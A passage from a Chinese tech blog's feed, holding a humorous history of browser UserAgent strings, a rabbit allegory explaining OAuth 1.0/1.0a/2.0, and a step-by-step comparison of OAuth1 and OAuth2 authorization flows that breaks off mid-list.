je 或jz 若相等则跳(机器码74 或0F84)
jne或jnz 若不相等则跳(机器码75或0F85)
jmp 无条件跳(机器码EB)
jb 若小于则跳
ja 若大于则跳
jg
    
    </summary>
    
      <category term="Programming Language" scheme="http://home.meng.uno/categories/Programming-Language/"/>
    
    
      <category term="破解" scheme="http://home.meng.uno/tags/%E7%A0%B4%E8%A7%A3/"/>
    
      <category term="ASM" scheme="http://home.meng.uno/tags/ASM/"/>
    
      <category term="汇编" scheme="http://home.meng.uno/tags/%E6%B1%87%E7%BC%96/"/>
    
  </entry>
  
  <entry>
    <title>浏览器野史 UserAgent列传</title>
    <link href="http://home.meng.uno/articles/fb689d08/"/>
    <id>http://home.meng.uno/articles/fb689d08/</id>
    <published>2014-10-05T09:26:00.000Z</published>
    <updated>2020-12-02T02:08:59.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote>  <p>某天，我做一个小项目，需要判断一下浏览器类型。简单的呀。 控制台敲下：    <code>navigator.userAgent</code> 浏览器回应：    <code>Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36</code>天，这串是啥？你怎么连话都说不清楚？</p></blockquote><p>我对userAgent并不陌生，但明明一个单词就可以说清楚的事情，却是这么掏心掏肺的回答。怪可怜的，一定有冤情。</p><p>后来我查阅了很多资料，发现历史非常的精彩。</p><h1>大事年表</h1><ul>  <li>1990年: Nexus(WorldWideWeb)诞生</li>  <li>1993年1月23日：Mosaic诞生</li>  <li>1994年12月：Netscape(Mozilla)诞生</li>  <li>1995年4月：Opera诞生</li>  <li>1995年8月16日：Internet Explorer诞生</li>  <li>2002年9月23日：Firefox诞生</li>  <li>2003年1月7日：Safari诞生</li>  <li>2008年9月2日：Chrome诞生</li></ul><h1>一、盘古开天地</h1><p>很久很久之前，上古大神Berners-Lee发明了WorldWideWeb，即万维网。同时，李大神也发明了第一款浏览器。真是具有跨时代意义的工具呀，好伟大呀，人们在想，叫什么好呢？ 但大神就是大神，大神内心的想法又岂是尔等凡人能够肆意揣摩？</p><p>万万没想到，李大神说，我这浏览器，也叫WorldWideWeb！不行么？ 行行行。</p><p>虽然李大神起名字这么拽，但他后来发觉，还是得赋予一点承上启下的历史意义，就改名成“Nexus”。值得注意的是，这浏览器，居然是可以兼容Unix跟Microsoft DOS的。它在当时流行的各种电脑上跑得飞起，应用也越来越广，被称为“杀手级应用”。杀手级…你们看互联网一开始就是这么的腥风血雨。</p><p>但这个浏览器，还不支持图片的显示，这是出现UserAgent的导火索。</p><h1>二、唐尧虞舜</h1><p>93年，伊利诺大学的NCSA组织认为，浏览器无图无真相，这不好。因而他们发明了第一款可显示图片的浏览器。 真是具有跨时代意义的工具呀，好伟大呀，人们在想，叫什么好呢？ 但大神就是大神，大神就是连起名字都让你惊心动魄。</p><p>NCSA组织说，它能显示图片，偏偏我们就要叫它“马赛克(Mosaic)”！不行么？ 行行行。</p><p>但有人就问了，Nexus不显示图片，Mosaic能显示，你们让html提供者怎么写代码？你们是不是想逼死选择困难症患者？有没有考虑过天秤座的感受？</p><p>因而UserAgent就诞生了。Mosaic将自己标志为<code>NCSA_Mosaic/2.0 (Windows 3.1)</code>，大家该怎么写代码就怎么写，但请求会带上这个信息，服务器就知道该不该返回能显示图片的html。UserAgent君，出生时跟我们设想的一样简单，仅仅标明了自己是什么浏览器，在什么系统运行，以及各自的版本号。</p><p>新旧浏览器们像彬彬有礼的君王，商议和让位是为了更好的繁荣。但风雨欲来。</p><h1>三、楚汉争霸</h1><p>像刘邦一样，走出来一个搅局的小流氓。当然他还是很有志向的，他的目标，就是战胜霸主Mosaic。后来，他还真的做到了。 如今，所有现代浏览器的UserAgent里都有它的标志，就像汉朝之后，我们都称为“汉”人。一群很有天赋的程序员，一起缔造了它的辉煌。</p><p>真是具有跨时代意义的工具呀，好伟大呀，人们在想，它叫什么呢？ 但大神就是大神，大神就是让你永远也猜不到他们想了个什么名字。 大神们说，叫Mozilla，不行么？ 行。但什么意思呢？</p><p>含义有二。其一，哥斯拉(Godzilla)谐音，诚然是一头野心勃勃的怪兽；其二，&quot;Mosaic Killa&quot;之意，Killa是俚语中Killer的拼法，即“马赛克的终结者”，赤裸裸的挑战。</p><p>惊呆了的Mosaic小心翼翼的念着Mozilla这发音：“Mo…摸咋了？”勃然大怒，“摸你妹！”</p><p>鉴于Mosaic当时的权势，Mozilla改名成Netscape Navigator(网景航海家)。小怪兽突然变成有点文艺小清新的名字，郁闷得很，但内心的血液沸腾着。虽然叫大名叫网景，但它把UserAgent偷偷设置成<code>Mozilla/1.0 (Win3.1)</code>。还是摸咋了？咬我？</p><h1>四、宋元之战</h1><p>很快，NetScape战胜了Mosaic，成为了新的霸主，因为其更优的展示。 NetScape最先支持了html框架显示，就是简单的table布局，内外边距之类，仅仅这点就将Mosaic抛诸身后。区别这两个浏览器，还是用的UserAgent。如果是UserAgent里含有“Mozilla”字样，那就发送支持框架的页面，否则，就发送不含框架的页面。</p><p>NetScape帝国日益庞大，歌舞升平，一切风平浪静，直到微软的铁骑挥军南下。</p><p>微软发布了一款跟系统强绑定的浏览器，真是具有跨时代意义的工具呀，好伟大呀，人们在想，它叫什么呢？ 不用想了，就是IE。这命名也相当简单粗暴，Internet Explorer，直接把这工具的用途拍在你脸上。连说明书都可以免了。</p><p>IE也是支持html标准框架的，但由于前面的历史原因，人们只会给UserAgent里含有“Mozilla”字样的浏览器发送含框架的页面。但这点小事能难倒我大微软？IE呵呵一笑，把自己的UserAgent改成<code>Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)</code>。看，我这里也有“Mozilla”字样，也能收到含框架的页面了！</p><p>当然，这个小流氓行为，跟后来把IE和Windows捆绑一起销售的大流氓行为比起来，根本不为足道。后面的故事我们也知道了，IE把NetScape干掉了。但它的身体上，却永远的烙上了“Mozilla”的印记。</p><h1>五、康乾盛世</h1><p>看过奥特曼的都知道，怪兽被打败了会再回来。别忘了NetScape曾拥有一批大神们，失败后，他们围绕着浏览器排版引擎Gecko(壁虎)成立了非正式组织Mozilla。小怪兽再次出发。大神们发明了另一款优秀的浏览器，它在插件拓展和开发调试领域做出的贡献，绝对可以载入互联网历史。</p><p>真是具有跨时代意义的工具呀，好伟大呀，人们在想，它叫什么呢？ 但大神就是大神，大神就是即使你知道了Mozilla的命名都是野兽，却还是猜不到是什么。 Mozilla说，我们浴火重生，叫Phoenix(凤凰)！不行么？ 真不行。</p><p>刚推出就被人告了，原来已经有一家公司叫做“凤凰科技”。 Mozilla瀑布汗，改名叫Firebird(火鸟)！还不行么？ 我们得原谅一下他们的取名，虽然现在看来满满的山寨感，可放在那个时代，Firebird这名字很炫酷。就像你当初的QQ昵称叫赤炎天使感觉依然良好一样。</p><p>但是，他们发现，业内有个数据库系统，也叫的Firebird…泪流满面的Mozilla感慨重生好难呀。最后才决定叫Firefox(火狐)。</p><p>基于Gecko引擎的Firefox非常优秀，为了告诉大家，我使用了这个引擎，它标志自己的UserAgent为<code>Mozilla/5.0 (Windows; U; Windows NT 5.1; sv-SE; rv:1.7.5) Gecko/20041108 Firefox/1.0</code>。 这时候的UserAgent，虽然长了点，但它并不混乱，准确的标明了系统，排版引擎，浏览器名称等信息。虽然IE这时已经占有了很大的市场份额，但基本停步不前；而Mozilla经过一段时间的修生养息，Firefox在业内广受好评，得到了快速的发展。</p><p>时值2003年，web2.0的浪潮前夕，浏览器的发展达到了空前的盛世。 然而所谓否极泰来，盛极则衰。涅槃的Firefox迎来盛世，却又恰恰由于盛世，决定了UserAgent纠结的命运。</p><h1>六、师夷长技</h1><p>前面说到，微软靠Windows系统捆绑IE销售。而Windows自然也有它的对手，Linux。一个技术快速发展的时代，系统的世界里也是战火纷飞。Linux系统自从有了可视化界面，也需要浏览器呀。桌面系统KDE的缔造者们就发明了一个。</p><a id="more"></a><p>真是具有跨时代意义的工具呀，好伟大呀，人们在想，它叫什么呢？ 但大神就是大神，大神就是讲究先从文字上占据压垮你的气势。 先有Navigator航海家，再有Explorer探索者，咱就叫Konqueror(Conqueror的变体)征服者吧。 行行行。我已懒得理这帮大神…</p><p>可是，问题来了。Konqueror使用KHTML排版引擎，即使它们认为自己跟Gecko引擎一样优秀，但用户不买单。你UserAgent里没有“Gecko”字样，我就不给你经过优良排版的html。 结果，Konqueror思来想去，做了一个艰难但很萌的决定，把UserAgent写成  <code>Mozilla/5.0 (compatible; Konqueror/3.2; FreeBSD) (KHTML, like Gecko)</code>… 这就是现代浏览器里  <code>like Gecko</code>这一萌词的由来。</p><p>就这样，伟大的排版引擎KHTML为了获得更好的资源，师夷长技。这并没什么不好，却造成了UserAgent的越发混乱。 KHTML与Gecko这一对，永远卿卿我我比翼双飞在UserAgent里面了。那个满含深意的“like”，有人觉得翻译成“像”，但也有人觉得应该是“喜欢”…</p><h1>七、世界大战</h1><p>首先是IE冷静下来了，他觉得，你们不带这么玩的？ 就我年少时不懂事，首先改了个Mozilla字样，后面追究这历史我岂不是成了罪魁祸首？我改还不行吗？ 在IE6，它明确自己UserAgent为  <code>Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0)</code>。除去已经注定不可抹去的“Mozilla”字样，其余信息简洁，准确，清晰。</p><p>但事态已经不可收拾。</p><p>Opera给这狂躁的世界添了一把火。它觉得，易容术非常炫酷呀。Opera直接在菜单提供了<code>Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 9.51</code>，<code>Mozilla/5.0 (Windows NT 6.0; U; en; rv:1.8.1) Gecko/20061208 Firefox/2.0.0 Opera 9.51</code>，<code>Opera/9.51 (Windows NT 5.1; U; en)</code>三个选择项。第一个是易容成IE，第二个是易容成火狐，第三个才是自己，选谁就是谁！</p><p>其实这并不是一件坏事。因为Opera是站在能够让用户通过选择，去获得更好的浏览体验的基础上的。你提供选择，或是不提供，混乱的UserAgent还是在这，不离，不弃。再者，这对网页的开发者有极大的好处，在某些情况，你不必同时打开几个不同的浏览器去调试。到目前，最新的Chrome浏览器更加炫酷，能够支持近40种不同的UserAgent，甚至你还可以自定义。当然这是后话。</p><p>与此同时，苹果公司依靠内核WebKit，开发出Safari，命名UserAgent为<code>Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/85.7 (KHTML, like Gecko) Safari/85.5</code>。</p><p>有人就会问了，不是Webkit内核吗，怎么还有<code>KHTML, like Gecko</code>？注意，内核Webkit包含了一个排版引擎叫WebCore，而WebCore是KHTML衍生而来的。也就是说，WebCore是KHTML的儿子，子承父业，基因差不多。为了能够正常排版，safari只能这么写。</p><p>后来，google也开发了自己的浏览器Chrome，其内核也是Webkit，但它设定UserAgent为<code>Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.27 Safari/525.13</code>。Safari一看，不对劲啊！你怎么也在后面写有Safari？Chrome呵呵一笑，你懂的。</p><p>因此，请让我一口气说完下面这一段： Chrome希望能得到为Safari编写的网页，于是决定装成Safari，Safari使用了WebKit渲染引擎，而WebKit呢又伪装自己是KHTML，KHTML呢又是伪装成Gecko的。同时所有的浏览器又都宣称自己是Mozilla。</p><p>这就是整个UserAgent世界大战的格局…</p><h1>八、军阀混战</h1><p>将目光聚焦到国内，更是狼烟四起，混乱不堪。大家都知道，浏览器是互联网的入口，这块肥肉谁也不想丢。因而一个接一个的“国产”浏览器进入斗兽场。 360，百度，QQ，UC，搜狗，猎豹，遨游，世界之窗…你能说出一大堆。连淘宝，酷狗，hao123都有浏览器，不信你搜。 注意我前面“国产”两个字必须加上双引号，因为这个made in china并不纯。国人并没能像远古大神一样，硬生生发明一个内核出来，我们更擅长“微创新”。</p><p>利用Trident（IE的内核），包装一下皮肤，美化一下，就可以说：完美兼容 利用Webkit，包装一下皮肤，美化一下，就可以说：极速浏览 把两个内核都包起来，就可以说：智能双核</p><p>是微创新！读书人的事，能叫偷吗？</p><p>在这插播一下，浏览器的“双核”，并不是你听说手机双核电脑双核那回事。再多个核，速度也不会更快，当然这么说，会显得很厉害的样子。德艺双馨，智勇双全，名利双收，才貌双绝，夫妻双双把家还，你看带“双”字的词都很牛的。</p><p>但我上面的叙述，的确有夸张的成分。浏览器的诞生，肯定不仅仅是包一下皮肤那么简单，国内的工程师们，也苦心研究做了许多工作。如果要说优化策略，我可以再写一篇超级长的文章。优化无止境，路漫漫其修远，向同行们致敬。只是我非常讨厌那些不把事实说清楚，纯粹靠文案去忽悠人的产品…</p><p>话说回来，这么多国产浏览器，总得靠不同UserAgent标志自己呀。 大家自动分为两个阵营：使用Trident内核的，在IE已有UserAgent后添加自己的名称；使用Webkit内核的，就在Chrome的UserAgent后面添加。</p><p>前者像QQ浏览器：<code>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; QQBrowser/7.7.26717.400)</code>。<br> 后者像猎豹：  <code>Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/537.36 LBBROWSER</code>。 当然双核浏览器诚然就是墙头草，切换内核时UserAgent也需要跟着变化。</p><p>如此的混战格局，这厢的IE和Chome想必也是醉了。</p><h1>九、国共内战</h1><p>适者生存是不变的生存法则，国产浏览器们经过一段时间的用户筛选，自然优胜劣汰。时值2010年，真正还在运营和更新的浏览器数量慢慢下降，用户集中在几家表现更优异的厂商手中。就在这时，好看的故事来了——3Q大战爆发。</p><p>有人说，腾讯电脑管家的推出是导火索。其实这场仗，大家都忍了好久，推不推出，都一定会在某个事件后爆发。360浏览器是奇虎的重量级产品，用户量众多，2009年它推出一个功能：过滤其它网站的广告。诚然民众们都很喜欢。可是其他互联网公司肯定就不乐意了，用户看不到更点击不到广告，这钱还怎么赚？</p><p>因而在3Q大战爆发后，腾讯的一个手段就是：如果你使用360浏览器，就不能访问QQ的网站（单单QQ空间就有巨大的用户量），也直接反攻360的最大收入来源。一个艰难的决定背后，往往是需要无数种的技术战略支撑的。企鹅判断用户是否使用360浏览器，依靠的就是UserAgent里是否有“360SE”的字样。</p><p>战报传来：号外，360浏览器上不了QQ空间！已经买了黄钻的杀马特贵族急了呀！只能换浏览器了呀！感覺侢乜卟哙噯嘞呀！</p><ul>  <li>2011年11月3日，腾讯网站封杀360浏览器</li>  <li>2011年11月4日，360浏览器访问量仅为昨日一半</li>  <li>2011年11月5日，360浏览器访问量几乎为0</li></ul><p>有人说，腾讯就这么快赢了？恰恰相反，360浏览器通过一次强制的自动升级，又可以访问QQ的网站了。360的工程师们在5日使用了伪装术——把“360SE”字样从UserAgent中去掉！ 意思就是，360浏览器的UserAgent跟IE完全一样，你根本判断不出来（因而访问量为0）。就怕流氓有文化！企鹅傻眼了，总不能把大微软的IE也一并给禁了吧…</p><p>这场土匪遇恶霸的耍流氓大战，最终通过法律而化解。企鹅在技术侧拿360没办法，而360则得到了一个跟IE一样的身份证。在这场内战中，受伤的除了广大网民们，其实还有令人心疼UserAgent君，以往让它越长越长就算了，这次长了还得阉割掉，真心dan疼呀。</p><h1>十、明日边缘</h1><p>看到这里，大家会明白一个道理：如果未来不出现一款霸主级别的浏览器（或内核），UserAgent应该不会有大变化了。 不过，这道理并不全对。别忘了，移动侧也是有浏览器的。 在早期能上网的手机里，内置了各手机厂商自研的浏览器。这些浏览器并不需要像PC一样的复杂设计，可以访问wap网页就足够了。因而它们的UserAgent命名，怎么简单怎么来，就直接叫  <code>诺基亚 3100 Nokia3100/06.01 (UCWEB 3.3B)</code>，<code>PHILIPS755 ObigoInternetBrowser/2.0</code> 这样，有甚者连浏览器叫什么都不带 <code>TCL-3199</code>，<code>三星 E618 SEC-SGHE618</code>。</p><p>这样任由发展下去，一种要历史重演，往日重现的即视感压迫而来。 web世界的联合国——W3C组织，站在明日边缘，面对着历史和未来，终于发话，它制定UserAgent标准，以后都得按这规范去起名字。详细请阅  <a href="http://www.w3.org/TR/UAAG/" target="_blank" rel="noopener">User Agent Accessibility Guidelines</a>。至此，命运坎坷的UserAgent终于逐步走向规范。W3C大法好，有人说你怎么不早点来拯救世界呀！其实W3C一直在努力，但规范的制定，到推广至大家认可并执行，是一条漫长的道路，需要时间，也需要实践。 W3C组织，在制定web标准这件工作之外，再我看来，还有两个身份：1、和事佬；2、背黑锅。和事不成，就得背黑锅。是的就是这样。</p><h1>彩蛋</h1><p>那么，我们的故事接近尾声。还有一些有趣的小彩蛋。</p><ol>  <li>Chome 28开始，与苹果正式分道扬镳，采用Blink内核，但它的UserAgent并不改变。</li>  <li>淘宝封杀微信打开淘宝页面，靠的就是微信内置浏览器UserAgent里的MicroMessenger字样。其实微信也可以像当初360一样把UserAgent去掉，但微信并不这样做。</li>  <li>360出招之时留有后招。也许，它一开始就想到了腾讯会告他们对于UserAgent的欺瞒，因而它其实提供了设置项。默认设置是“保持跟IE一样的UserAgent”，但用户也可以不勾选。只是这选项比较隐蔽，而且你重启浏览器后…又会变回默认设置。如果没有这个小小的设置，结果大家可以自行想象。</li>  <li>微软又玩新花样了，在泄露版IE 11中，去掉了以往的MSIE字样。初步猜测此举是为了使现有的 CSS hack 失效，避免过去网页设计师对IE差别对待的情况再度发生。但又会引发其他问题啊亲。</li></ol><p><br><br>本文链接： <a href="http://home.meng.uno/articles/fb689d08/">http://home.meng.uno/articles/fb689d08/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      某天，我做一个小项目，需要判断一下浏览器类型。简单的呀。 控制台敲下： navigator.userAgent 浏览器回应： Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36天，这串是啥？你怎么连话都说不清楚？

我对userAgent并不陌生，但明明一个单词就可以说清楚的事情，却是这么掏心掏肺的回答。怪可怜的，一定有冤情。

后来我查阅了很多资料，发现历史非常的精彩。

大事年表
 * 1990年: Nexus(WorldW
    
    </summary>
    
      <category term="Software Engineering" scheme="http://home.meng.uno/categories/Software-Engineering/"/>
    
    
      <category term="web" scheme="http://home.meng.uno/tags/web/"/>
    
      <category term="浏览器" scheme="http://home.meng.uno/tags/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
      <category term="userAgent" scheme="http://home.meng.uno/tags/userAgent/"/>
    
  </entry>
  
  <entry>
    <title>兔子，胡萝卜与OAuth的故事</title>
    <link href="http://home.meng.uno/articles/a4df422f/"/>
    <id>http://home.meng.uno/articles/a4df422f/</id>
    <published>2014-08-20T04:55:00.000Z</published>
    <updated>2020-12-02T01:56:57.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote>  <p>简单的故事，就别用复杂的方式传诵</p></blockquote><h1>讲几个故事</h1><p>从前，有只老兔子，在仓库里存了一万根胡萝卜，作为给小兔子的遗产。而后他就去周游世界了。小兔子有天想去把萝卜拿出来，却被仓库外的一只兔子拦住了。一问才知道，这是老兔子安排的仓库守卫。和所有故事中的守护者一样，他正直而古板，八字眉下面有着睡眠不足的熊猫眼，世人一般称他为兔门神。兔子想要拿到萝卜，就得说服兔门神呀，于是他走了上前…</p><p>#兔子与OAuth1.0的故事</p><ol>  <li>兔子首先得证明自己是只兔子，不是狗熊也不是狼，于是他向兔门神出示了身份证</li>  <li>兔门神说：哦，你是只兔子。但你还得证明你是老兔子的兔崽子呀。兔子说我爸旅游去了，怎么证明呢？兔门神说，这样吧，我把你的身份证拍下来，发送给你爸，让他看下这是不是你。于是兔门神打开了微信……</li>  <li>正在休假的老兔子看了下照片，回复说证件照好难看毁三观啊，但勉强认得出这货就是我儿子</li>  <li>兔门神确认这信息后，说，你老爸还是认你这个儿子的</li>  <li>兔子问，那我可以去拿胡萝卜了没？</li>  <li>兔门神说，可以了，这样吧，我发你个通行证，以后拿这个来我就不用这么麻烦了。</li></ol><h1>兔子与OAuth1.0a的故事</h1><p>这种貌似天衣无缝的形式，却被一只坏兔子看出了破绽。他注意到一个细节，在最后的一步，兔门神都是习惯性的把通行证交给了面前的兔子,而不管这只兔子是不是当初的那只。于是，坏兔子趁兔门神正在和老兔子聊微信的时候，一个劲站在了兔子前面，最后兔门神居然把通行证塞给了他！这怎么可以？于是在第一步和第六步又有了修改。</p><ol>  <li>兔子出示身份证的同时，也出示了自己的私房照，说，门神大哥呀，后面你记得把通行证给照片上的帅哥！</li>  <li>……</li>  <li>……</li>  <li>……</li>  <li>……</li>  <li>兔门神看了下面前的兔子，私房照上的明显P过嘛但勉强认得出是本人，于是才交出了通行证</li></ol><h1>兔子与Oauth2.0的故事</h1><p>兔门神回家后，向他的老婆兔女神汇报了今天的工作，更安全的方案使他得意洋洋，没想到被兔女神骂了一顿。兔女神说，兔子证明自己还得带个身份证，你不知道在天朝办个身份证多麻烦吗？让小兔子跟老兔子去聊下微信就可以了干嘛要你插手？兔门神哑口无言，兔女神高贵冷艳的说我有四种方案，给你先说说最常用的一种吧。</p><ol>  <li>兔子一开始就跟他老爸聊微信了。当然他得明确告诉老爸，他需要打开哪个仓库（因为老兔子有很多儿子，每个儿子去拿萝卜的仓库不一样，兔子要指定一下具体是哪个，问他可不可以）</li>  <li>老兔子回复说：“just do IT”…</li>  <li>兔子然后去拿胡萝卜，首先被兔女神拦住了。女神告诉他，你要给我四样东西：老兔子的回复，你的私房照，身份证，还要给我一个密码。兔子愣愣的想了个密码，把这四样东西交了过去</li>  <li>兔女神把这四种东西混在一起，用魔法变出了两件法宝：一封情书和一撮猴子毛…然后她解释说：拿着我的情书去找我老公，他就让你进仓库了；但是这情书会过期，是出于安全考虑啦，过期后你得召唤我再写一封，召唤出我的步骤就是吹一下猴子毛，像孙悟空那样你就别在意这些细节好伐？</li>  <li>兔子拿着情书去找兔门神时，发现他由于被妻子分担了压力，明显睡眠好多了…</li></ol><h1>演员表</h1><p><strong>兔子</strong>-消费者，也就是第三方应用</p><p><strong>老兔子</strong>-用户，也就是我们，记住，我们永远是第三方的亲爹</p><p><strong>仓库</strong>-Oauth提供者，这里有我们保存的资料，比如说新浪微博，qq空间，人人…</p><p><strong>兔门神</strong>-在前两个故事中，由授权服务器和资源服务器共同扮演，在最后的故事中，只由资源服务器扮演</p><p><strong>兔女神</strong>-授权服务器，只管授权，不管取资源</p><h1>重要道具</h1><p><strong>身份证</strong>-签名，将一个http请求以及相应参数字符串化<br>  <strong>拍下的身份证照片</strong>-Request Token，服务器进行认证<br>  <strong>通行证</strong>-Access Token，获取资源的凭证<br>  <strong>私房照</strong>-重定向地址<br>  <strong>坏兔子</strong>(我把它当成道具而不是演员)-重定向地址劫持<br>  <strong>仓库的名称</strong>-appId,即对应具体哪个第三方<br>  <strong>just do it</strong>-Auth code，用户授权号<br>  <strong>第三个故事的身份证</strong>-client id 客户端帐号<br>  <strong>密码</strong>-client secret 客户端密码<br>  <strong>魔法</strong>-将client id，client secket，重定向地址，Auth code生成Access Token<br>  <strong>情书</strong>-Access Token，获取资源的凭证<br>  <strong>猴子毛</strong>-Refresh Token，用来在Access Token过期后将其刷新，刷新需带上client id和client secret</p><h1>说书人说</h1><p>Oauth2.0比起Oauth1.0，没有了第一步的签名，将服务器分开为授权服务器与资源服务器。这是最大的两个特征。开放平台必须得做到对第三方友好，才有利于接入。像Oauth1.0签名的操作，就难倒了许多第三方。也许你知道了Oauth2.0接入步骤简化了些，但也知道其内部实现要更复杂，抛去安全方面的考虑，我认为这是正确的方向。因为，Oauth2.0在某种意义上说，向第三方做到了——“把悲伤留给自己，你的美丽让你带走”。</p><p><br><br>本文链接： <a href="http://home.meng.uno/articles/a4df422f/">http://home.meng.uno/articles/a4df422f/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      简单的故事，就别用复杂的方式传诵

讲几个故事
从前，有只老兔子，在仓库里存了一万根胡萝卜，作为给小兔子的遗产。而后他就去周游世界了。小兔子有天想去把萝卜拿出来，却被仓库外的一只兔子拦住了。一问才知道，这是老兔子安排的仓库守卫。和所有故事中的守护者一样，他正直而古板，八字眉下面有着睡眠不足的熊猫眼，世人一般称他为兔门神。兔子想要拿到萝卜，就得说服兔门神呀，于是他走了上前…

#兔子与OAuth1.0的故事

 1. 兔子首先得证明自己是只兔子，不是狗熊也不是狼，于是他向兔门神出示了身份证
 2. 兔门神说：哦，你是只兔子。但你还得证明你是老兔子的兔崽子呀。兔子说我爸旅游去了，怎么证明呢？兔门神
    
    </summary>
    
      <category term="Software Engineering" scheme="http://home.meng.uno/categories/Software-Engineering/"/>
    
    
      <category term="web" scheme="http://home.meng.uno/tags/web/"/>
    
      <category term="OAuth" scheme="http://home.meng.uno/tags/OAuth/"/>
    
  </entry>
  
  <entry>
    <title>OAuth1 VS OAuth2</title>
    <link href="http://home.meng.uno/articles/476220c8/"/>
    <id>http://home.meng.uno/articles/476220c8/</id>
    <published>2014-08-11T02:55:00.000Z</published>
    <updated>2020-12-02T01:57:11.000Z</updated>
    
    <content type="html"><![CDATA[<h1>一、写在前面</h1><p>在收集资料时，我查询和学习了许多介绍OAuth的文章，这些文章有好有坏，但大多是从个例出发。因此我想从官方文档出发，结合在stackoverflow上的一些讨论，一并整理一下。整理的内容分为OAuth1.0a和OAuth2两部分。</p><blockquote>  <p>OAuth 1.0a：One Leg -&gt; Two Leg -&gt; Three Legged<br> OAuth 2:Two Leg -&gt; Three Legged (附：Refresh Token的方式)</p></blockquote><p>这两种模式都是按箭头从左往右安全性递增，其实现也会相对复杂。关于官方的这种leg（腿？）的说法，在中文翻译中比较少有文章提及。下面分别来介绍OAuth的这5种授权流程。</p><h1>二、OAuth1.0a</h1><h2 id="oauth-1-0a-one-leg">OAuth 1.0a (One Leg)</h2><ol>  <li>应用给服务器发送一个签名请求，附带以下参数：    <ul>      <li>oauth_token Empty String</li>      <li>oauth_consumer_key</li>      <li>oauth_timestamp</li>      <li>oauth_nonce</li>      <li>oauth_signature</li>      <li>oauth_signature_method</li>      <li>oauth_version Optional</li>    </ul>  </li>  <li>服务验证并授予对资源的访问</li>  <li>应用程序利用请求的资源</li></ol><h2 id="oauth-1-0a-two-legs">OAuth 1.0a (Two Legs)</h2><ol>  <li>应用发送一个签名请求，以获取 Request Token：    <ul>      <li>oauth_consumer_key</li>      <li>oauth_timestamp</li>      <li>oauth_nonce</li>      <li>oauth_signature</li>      <li>oauth_signature_method</li>      <li>oauth_version Optional</li>    </ul>  </li>  <li>服务器返回Request Token：    <ul>      <li>oauth_token</li>      <li>oauth_token_secret</li>      <li>Additional Parameters / Arguments</li>    </ul>  </li>  <li>发送签名请求，用Request Token换取Access Token    <ul>      <li>oauth_token Request Token</li>      <li>oauth_consumer_key</li>      <li>oauth_nonce</li>      <li>oauth_signature</li>      <li>oauth_signature_method</li>      <li>oauth_version</li>    </ul>  </li>  <li>服务器返回Access Token和Token Secret</li>  <li>应用通过Access Token和Token Secret利用请求的资源</li></ol><h2 id="oauth-1-0a-three-legged">OAuth 1.0a (Three Legged)</h2><ol>  <li>应用发送一个签名请求，以获取 Request Token：    <ul>      <li>oauth_consumer_key</li>      <li>oauth_timestamp</li>      <li>oauth_nonce</li>      <li>oauth_signature</li>      <li>oauth_signature_method</li>      <li>oauth_version Optional</li>    </ul>  </li>  <li>服务器返回Request Token：    <ul>      <li>oauth_token</li>      <li>oauth_token_secret</li>      <li>oauth_callback_confirmed</li>      <li>… Additional Parameters / Arguments</li>    </ul>  </li>  <li>发送给用户授权的URL    <ul>      <li>oauth_token</li>    </ul>  </li>  <li>提示用户进行授权</li>  <li>用户进行授权</li>  <li>授权结束后返回应用，附带上：    <ul>      <li>oauth_token</li>      <li>oauth_verifier</li>    </ul>  </li>  <li>发送签名请求，用Request Token换取Access Token    <ul>      <li>oauth_token Request Token</li>      <li>oauth_consumer_key</li>      <li>oauth_nonce</li>      <li>oauth_signature</li>      <li>oauth_signature_method</li>      <li>oauth_version</li>      <li>oauth_verifier</li>    </ul>  </li>  <li>服务器返回Access Token和Token Secret</li>  <li>应用通过Access Token和Token Secret利用请求的资源</li></ol><h1>三、OAuth2</h1><h2 id="oauth-2-two-legged">OAuth 2 (Two Legged)</h2><h3 id="客户端凭据方式">客户端凭据方式</h3><ol>  <li>应用发送请求到服务器：    <ul>      <li>grant_type = client_credentials<br> 如果没有使用Authorization（Authorization: Basic Base64(client_id:client_secret)） 的header，必须附带参数为：</li>      <li>client_id</li>      <li>client_secret</li>    </ul>  </li>  <li>服务器以Access Token回应    <ul>      <li>access_token</li>      <li>expires_in</li>      <li>token_type</li>    </ul>  </li></ol><h3 id="隐式授予方式">隐式授予方式</h3><ol>  <li>应用发送请求到服务器：    <ul>      <li>response_type = token</li>      <li>redirect_uri This is a server-side Redirection URI hosted by the provider or yourself.</li>      <li>scope</li>      <li>state Optional</li>      <li>client_id</li>    </ul>  </li>  <li>用户可根据需要授权。    <ul>      <li>username</li>      <li>password</li>    </ul>  </li>  <li>服务器将响应包含access_token在内的redirect_uri</li>  <li>应用程序跳转至redirect_uri</li>  <li>redirect_uri将响应一段脚本或HTML片段。响应的脚本或HTML片段包含参数access_token，还有您可能需要的任何其他参数。</li></ol><h3 id="资源所有者密码方式">资源所有者密码方式</h3><ol>  <li>应用向资源所有者请求凭证    <ul>      <li>username</li>      <li>password</li>    </ul>  </li>  <li>应用使用凭证，向服务器发送请求    <ul>      <li>grant_type = password</li>      <li>username</li>      <li>password<br> url看起来会像这样：grant_type=password&amp;username=my_username&amp;password=my_password        <br> 如果你没有使用Authorization的header，必须附带上参数：      </li>      <li>client_id</li>      <li>client_secret<br> url看起来会像是：        <br> grant_type=password&amp;username=my_username&amp;password=my_password&amp;client_id=random_string&amp;client_secret=random_secret      </li>    </ul>  </li> 